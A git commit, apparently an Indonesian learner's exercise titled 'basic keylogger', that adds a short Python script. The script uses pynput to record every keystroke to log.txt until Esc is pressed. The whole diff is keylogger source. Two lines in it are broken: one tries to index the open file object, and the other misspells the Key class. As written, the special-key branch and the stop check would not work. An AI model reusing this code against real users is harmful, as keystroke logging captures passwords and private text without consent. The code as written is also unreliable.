0bd809ae259fbcf483d44cddaefafc3a7a138abd
Fahrurrozy <rrozif96@gmail.com>
2025-07-31 23:21:41 +0700

    keylogger dasar

---
+++ project/kyloger.py
@@ -0,0 +1,19 @@
+from pynput import keyboard
+
+log_file = "log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f[{key}])
+
+def on_release(key):
+    if key == keyboard.key.esc:
+        return False
+
+print("Keylogger berjalan.... Tekan 'Esc' untuk berhenti. " )
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
